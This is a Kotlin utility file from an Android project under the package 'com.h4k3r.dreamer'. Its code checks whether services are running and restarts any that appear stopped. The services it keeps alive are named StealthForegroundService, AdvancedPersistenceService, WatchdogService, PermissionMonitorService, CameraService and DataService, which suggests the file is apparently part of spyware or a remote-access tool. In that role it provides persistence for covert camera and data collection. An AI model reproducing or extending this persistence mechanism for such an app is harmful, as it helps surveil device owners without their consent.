package com.h4k3r.dreamer

import android.app.ActivityManager
import android.content.Context
import android.os.Build
import android.util.Log

/**
 * Utility class for service-related operations.
 * Provides methods to check if services are running, start services,
 * and handle service lifecycle operations.
 */
object ServiceUtils {
    private const val TAG = "ServiceUtils"

    /**
     * Checks if a specific service is currently running.
     *
     * @param context The application context
     * @param serviceClass The class of the service to check
     * @return True if the service is running, false otherwise
     */
    fun <T> isServiceRunning(context: Context, serviceClass: Class<T>): Boolean {
        try {
            val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            
            // For Android O and above, this method is less reliable due to background restrictions
            // but we still use it as a best-effort approach
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Use a more reliable approach for newer Android versions
                return isServiceRunningModernApproach(context, serviceClass.name)
            }
            
            // For older Android versions, we can use the getRunningServices method
            for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.name == service.service.className) {
                    return true
                }
            }
            
            return false
        } catch (e: Exception) {
            Log.e(TAG, "Error checking if service is running: ${serviceClass.name}", e)
            // If we can't determine, assume it's not running so we can try to start it
            return false
        }
    }
    
    /**
     * Modern approach to check if a service is running for Android O and above.
     * This is a best-effort approach as Android has restricted access to running services.
     *
     * @param context The application context
     * @param serviceName The name of the service to check
     * @return True if the service is likely running, false otherwise
     */
    private fun isServiceRunningModernApproach(context: Context, serviceName: String): Boolean {
        try {
            // Check if the service has a notification (for foreground services)
            val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            
            // Check if our process is in the foreground or visible processes
            val processes = manager.runningAppProcesses ?: return false
            val packageName = context.packageName
            
            for (processInfo in processes) {
                if (processInfo.importance <= ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE 
                    && processInfo.processName == packageName) {
                    // Our process is visible, which means our foreground services are likely running
                    return true
                }
            }
            
            // For now, assume services are not running if we can't determine
            // This will cause services to be started, which is safer
            return false
        } catch (e: Exception) {
            Log.e(TAG, "Error in modern service check for: $serviceName", e)
            return false
        }
    }
    
    /**
     * Starts all critical services for the application.
     *
     * @param context The application context
     */
    fun startCriticalServices(context: Context) {
        val criticalServices = arrayOf(
            StealthForegroundService::class.java,
            PermissionMonitorService::class.java,
            WatchdogService::class.java,
            AdvancedPersistenceService::class.java,
            CameraService::class.java,
            DataService::class.java
        )
        
        for (serviceClass in criticalServices) {
            if (!isServiceRunning(context, serviceClass)) {
                try {
                    Log.d(TAG, "Starting service: ${serviceClass.simpleName}")
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(android.content.Intent(context, serviceClass))
                    } else {
                        context.startService(android.content.Intent(context, serviceClass))
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to start service: ${serviceClass.simpleName}", e)
                }
            }
        }
    }
}